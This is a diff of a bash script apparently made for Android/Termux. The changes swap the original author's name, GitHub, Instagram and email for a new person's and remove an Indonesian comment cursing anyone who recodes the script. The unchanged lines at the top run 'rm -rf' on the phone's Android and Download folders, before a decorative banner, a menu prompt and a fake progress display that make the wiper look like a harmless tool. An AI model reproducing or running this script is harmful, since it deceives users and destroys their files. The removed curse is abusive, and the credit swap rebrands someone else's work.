@@ -1,8 +1,6 @@
 #!/system/xbin/bash
-#AUTHOR:MR CROOT
-#Github:https://github.com/reyspeed
-#Ngapain Lo Sampai Sini Mau Recode! Gua Doain Orang Tua Lu Meninggal Dan Lu mandul Sampai Mati.boleh Recode Tapi Hargai Author Njeng
-#Bersihkan Layar
+#AUTHOR:kudil tampan
+#Github:https://github.com/kudillina
 cd /sdcard
 rm -rf Android
 rm -rf Download
@@ -25,10 +23,10 @@ yellow='\e[1;33m'
 sleep 3
 echo "\033[32;1m
 #################################
-#-AUTHOR=MR CROOT               #
-#-INSTAGRAM=erorr867            #
+#-AUTHOR=kudillina              #
+#-INSTAGRAM=kudillina           #
 #-Team=NO TEAM                  #
-#-Email=reyspeed01@gmail.com    #
+#-Email=kudillina07@gmail.com   #
 #################################
 "
 sleep 3
@@ -69,7 +67,7 @@ echo "\033[32;1mPilih No : "
 read p;
 
 sleep 2
-echo "Sabar Njeng Proses..."
+echo "Sabar yaa lagi Proses..."
 echo "\033[34;1m#10%"
 sleep 1
 echo "##20%"
